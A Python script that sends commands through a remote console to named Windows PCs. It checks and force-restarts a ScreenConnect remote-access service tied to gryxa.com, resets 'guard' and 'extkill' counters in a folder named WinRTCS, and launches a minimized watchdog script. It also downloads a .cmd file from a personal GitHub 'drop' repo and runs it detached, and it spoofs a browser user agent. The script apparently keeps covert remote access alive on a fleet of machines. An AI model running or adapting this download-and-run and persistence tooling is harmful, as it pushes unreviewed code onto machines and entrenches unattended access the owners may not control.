#!/usr/bin/env python3
"""Recover still-stopped Gryxa hosts + Sight online-no-gryxa; final live recheck."""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

BASE = "https://debian.seczio.com"
ADMIN = ((Path(__file__).resolve().parent / "secrets" / "admin_token.txt")).read_text(encoding="utf-8").strip()
OUT = Path.home() / "Desktop" / "gryxa_fleet_scan.txt"

PROBE = (
    "powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='SilentlyContinue'; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' } | Select-Object -First 1; "
    "if(-not $s){ Write-Output 'GRYXA=MISSING' } else { "
    "$g= if($s.PathName -match 'gryxa\\.com'){'YES'} else {'NO'}; "
    "Write-Output ('GRYXA='+$s.State+'|PATH_GRYXA='+$g+'|START='+$s.StartMode) "
    "}; Write-Output 'GRYXA_PROBE_DONE'\""
)

# Aggressive start: enable + start + check StartType
START2 = (
    "powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='Continue'; "
    "$n='ScreenConnect Client (36e506ff016b2151)'; "
    "Set-Service -Name $n -StartupType Automatic -ErrorAction SilentlyContinue; "
    "Start-Service -Name $n -ErrorAction SilentlyContinue; "
    "Start-Sleep -Seconds 3; "
    "$s=Get-Service -Name $n -EA SilentlyContinue; "
    "if($s){ Write-Output ('AFTER='+$s.Status+'|STARTTYPE='+$s.StartType) } "
    "else { Write-Output 'AFTER=MISSING' }\""
    r" & >C:\ProgramData\WinRTCS\extkill.cnt echo 0"
    r" & >C:\ProgramData\WinRTCS\guard.cnt echo 9999"
    r' & start "" /min cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd'
    " & echo START2_DONE"
)

INSTALL_CMD = (
    'start "" /min cmd.exe /c "'
    r"C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 90"
    r" -o C:\Users\Public\gryxa_recover.cmd"
    " https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd"
    r" & call C:\Users\Public\gryxa_recover.cmd --detached"
    '" & echo INSTALL_GRYXA_QUEUED'
)


def api(path: str, fields: dict | None = None) -> str:
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    req = urllib.request.Request(BASE + path, data=data)
    req.add_header("Authorization", "Bearer " + ADMIN)
    req.add_header("User-Agent", "Mozilla/5.0 (WinRTCS-Console)")
    with urllib.request.urlopen(req, timeout=90) as r:
        return r.read().decode(errors="replace")


def api_json(path: str) -> dict:
    return json.loads(api(path))


def queue(target: str, cmd: str) -> int:
    text = api("/cmd", {"target": target, "cmd": cmd})
    print(text.strip())
    m = re.search(r"id=(\d+)", text)
    if not m:
        raise RuntimeError(text)
    return int(m.group(1))


def wait_results(cid: int, min_n: int = 85, timeout: float = 200.0) -> list[dict]:
    t0 = time.time()
    last = -1
    while time.time() - t0 < timeout:
        res = (api_json(f"/api/cmd/{cid}").get("results") or [])
        if len(res) != last:
            print(f"  cmd#{cid} results={len(res)} ({int(time.time()-t0)}s)")
            last = len(res)
        if len(res) >= min_n and (time.time() - t0) >= 85:
            time.sleep(15)
            return api_json(f"/api/cmd/{cid}").get("results") or []
        time.sleep(8)
    return api_json(f"/api/cmd/{cid}").get("results") or []


def classify(results: list[dict]) -> dict[str, list[str]]:
    buckets = {k: [] for k in ("RUNNING", "STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE")}
    detail = {}
    for r in results:
        host = r.get("host") or "?"
        out = r.get("out") or ""
        detail[host] = out
        m = re.search(r"GRYXA=([A-Za-z_]+)", out)
        if not m:
            buckets["NO_PARSE"].append(host)
            continue
        status = m.group(1).upper()
        if status == "RUNNING":
            buckets["WRONG_PATH" if "PATH_GRYXA=NO" in out else "RUNNING"].append(host)
        elif status in ("STOPPED", "STOP_PENDING", "START_PENDING", "PAUSED"):
            buckets["STOPPED"].append(host)
        elif status == "MISSING":
            buckets["MISSING"].append(host)
        else:
            buckets["OTHER"].append(host)
    buckets["_detail"] = detail  # type: ignore
    return buckets


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

    print("== prior start results ==")
    for cid in range(502, 507):
        d = api_json(f"/api/cmd/{cid}")
        res = d.get("results") or []
        print(f"#{cid} -> {d.get('target')} n={len(res)}")
        for r in res:
            print(" ", r.get("rc"), (r.get("out") or "")[:300].replace("\n", " | "))

    stuck = ["DESKTOP-L12E0G2", "DESKTOP-L66QG8O", "DESKTOP-RC2IJC1"]
    sight_targets = ["DESKTOP-3UFSG6P", "KYLEESPC", "SECRETARYPC", "MIKESCOMPUTER", "MRG-DELL"]

    print("== probe stuck hosts first ==")
    for h in stuck:
        queue(h, PROBE)
        time.sleep(0.2)
    time.sleep(70)

    print("== start2 on stuck ==")
    for h in stuck:
        queue(h, START2)
        time.sleep(0.2)
    time.sleep(50)

    # If still stopped after start2, recover-install
    print("== check stuck start2 ==")
    # Use latest ALL isn't ready; re-probe stuck individually and decide
    for h in stuck:
        cid = queue(h, PROBE)
        time.sleep(0.2)
    time.sleep(75)

    # Collect last probe results from cmd list is hard; just install all stuck + sight no-gryxa
    # Safer: install recover on anyone still not RUNNING from a fresh ALL later.
    print("== queue recover-install on stuck + sight-risk ==")
    for h in stuck + sight_targets:
        print("install", h)
        queue(h, INSTALL_CMD)
        time.sleep(0.15)

    print("== wait 200s for msiexec ==")
    time.sleep(200)

    print("== final ALL probe ==")
    cid = queue("ALL", PROBE)
    results = wait_results(cid)
    buckets = classify(results)
    detail = buckets.pop("_detail")  # type: ignore

    lines = [
        f"=== FINAL GRYXA SCAN {time.strftime('%Y-%m-%d %H:%M:%S')} cmd=#{cid} responded={len(results)} ==="
    ]
    for k in ("RUNNING", "STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        lines.append(f"{k}={len(buckets[k])}")
    lines.append("")
    for k in ("STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        if buckets[k]:
            lines.append(f"--- {k} ---")
            for h in sorted(buckets[k]):
                snip = detail.get(h, "").replace("\n", " | ")[:160]
                lines.append(f"  {h} :: {snip}")
            lines.append("")

    fleet = api_json("/api/fleet")
    counts = fleet.get("counts") or {}
    online_no = sorted(
        h["host"]
        for h in (fleet.get("hosts") or [])
        if h.get("presence") == "online" and not h.get("has_gryxa")
    )
    lines.append(f"SIGHT counts={counts}")
    lines.append(f"sight_online_no_gryxa={online_no}")

    # Focus hosts of interest
    focus = stuck + sight_targets + ["330MLRACE", "NBK-JBURKS"]
    lines.append("--- FOCUS ---")
    by = {r.get("host"): r.get("out") for r in results}
    for h in focus:
        out = by.get(h)
        if out is None:
            lines.append(f"  {h} :: (no response this wave)")
        else:
            lines.append(f"  {h} :: {out.replace(chr(10), ' | ')[:160]}")

    report = "\n".join(lines) + "\n"
    prev = OUT.read_text(encoding="utf-8") if OUT.exists() else ""
    OUT.write_text(prev + "\n" + report, encoding="utf-8")
    print(report)
    print("wrote", OUT)
    bad = buckets["STOPPED"] + buckets["MISSING"] + buckets["WRONG_PATH"]
    return 0 if not bad else 2


if __name__ == "__main__":
    raise SystemExit(main())
